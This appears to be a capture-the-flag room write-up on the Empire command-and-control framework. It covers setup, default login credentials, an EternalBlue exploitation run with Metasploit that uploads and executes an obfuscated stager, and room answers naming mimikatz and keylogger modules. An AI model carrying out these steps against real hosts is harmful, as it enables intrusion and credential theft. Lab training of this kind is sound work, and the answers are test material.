
# Empire

## *Setup*

Install the Empire from its [Github](https://github.com/BC-SECURITY/Empire/)

If you have troubles building Empire docker image because of permissions to
 /var/lib/python3/ directory, replace the following content of Dockerfile:

```
RUN apt-get update && \
      apt-get -y install \
        sudo \
	    python3-dev \
	    python3-pip \
	    apt-transport-https \
	    xclip \
	    zip \
    && rm -rf /var/lib/apt/lists/*
```

With this one:

```
RUN apt-get update && \
      apt-get -y install \
        sudo \
	    python3-dev && \
	    curl "https://bootstrap.pypa.io/get-pip.py" -o "install-pip3-ubuntu.py" && \
	    python3 install-pip3-ubuntu.py && \
	    apt-get update && \
			apt-get -y install \
				apt-transport-https \
				xclip \
				zip \
    && rm -rf /var/lib/apt/lists/*
```

Then build it and start:

```bash
$ docker build -t bcsecurity/empire .

$ docker create -v /empire --name data bcsecurity/empire

$ docker run -it -p 1337:1337 -p 8000:8000 --volumes-from data bcsecurity/empire server
```

Then,install Starkiller from its [Github](https://github.com/BC-SECURITY/Starkiller/releases ):

```bash
$ chmod +x starkiller-0.0.0.AppImage

$ ./starkiller-0.0.0.AppImage
```

To login, use default credentials

- Uri: 127.0.0.1:1337

- User: empireadmin

- Pass: password123

---

## *Exploitation*

Ok, let's deploy and exploit the machine. From the room description its pretty obvious 
that it's a Windows machine, vulnerable to EternalBlue exploit, but we'll confirm
it before we begin:

```bash
$ sudo nmap 10.10.13.146 -Pn -p 3389,445,135,139,5000 -A -vv -T4 --script vuln -oN nmap-scan --min-parallelism 55
```

```
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

```

Interaction via Starkiller is pretty much obvious.

login to Empire server and create an "http" listener. Specify your tryhackme IP
and port 8000:

![listener](https://i.postimg.cc/1Rg2wrPD/listener-config.png)

Then, in the sidebar select "Stagers" and create an "multi/launcher"
stager. Specify the previously created http listener in "listener" input and trigger
the "Obfuscate" toggle. Clear "Bypasses" and hit "Create" button in the header.

![stager](https://i.postimg.cc/N09mpF0C/stager-config.png)

Then, use the Stagers list to download copy payload. You better save the payload
to a .bat file.

![copy](https://i.postimg.cc/gJbXsKQr/copy-stager.png)

After you successfully saved the Empire stager, launch Metasploit and search for
eternalblue. Exploit the vulnerability, transfer the stager and execute it:

```
msf> search eternalblue

msf> use exploit/windows/smb/ms17_010_eternalblue

# set Rhost and lhost variables

msf> exploit

meterpreter> upload stager.bat

meterpreter> execute -f stager.bat
```

You should see something like this in "Agents":

![agent](https://i.postimg.cc/BQ50PBcM/agents.png)

---

## *Modules*

- What module allows you to use any mimikatz command?

Select the agent and navigate to "Interact" tab. Type in "mimikatz" in the
"Execute module":

![mimikatz](https://i.postimg.cc/nr4vqhkj/mimikatz.png)

> powershell/credentials/mimikatz/command

- What MITRE ATT&CK technique is associated with powershell/trollsploit/voicetroll?

Input the module name and the answer will appear

> T1491

- What module implants a keylogger on the device?

> powershell/collection/keylogger

- What MITRE ATT&CK technique is associated with the module above?

> T1056

